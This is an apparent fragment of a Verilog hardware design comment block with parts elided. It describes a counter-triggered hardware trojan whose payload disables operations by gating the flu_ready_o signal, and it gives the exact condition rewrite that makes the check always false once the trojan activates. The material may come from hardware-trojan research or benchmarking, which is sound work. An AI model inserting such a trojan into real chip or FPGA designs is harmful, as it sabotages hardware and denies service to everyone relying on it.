 ...
 * 
 * Description:
 *   Disables operations by blocking flu_ready_o control signal
 *   
 * Trigger: Counter on flu_ready_o
 * Payload: Block flu_ready_o when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block flu_ready_o when trojan is active
//
// IMPORTANT: flu_ready_o is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (flu_ready_o && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: flu_ready_o && 0 = 0 (always false)
//   All operations controlled by flu_ready_o are blocked
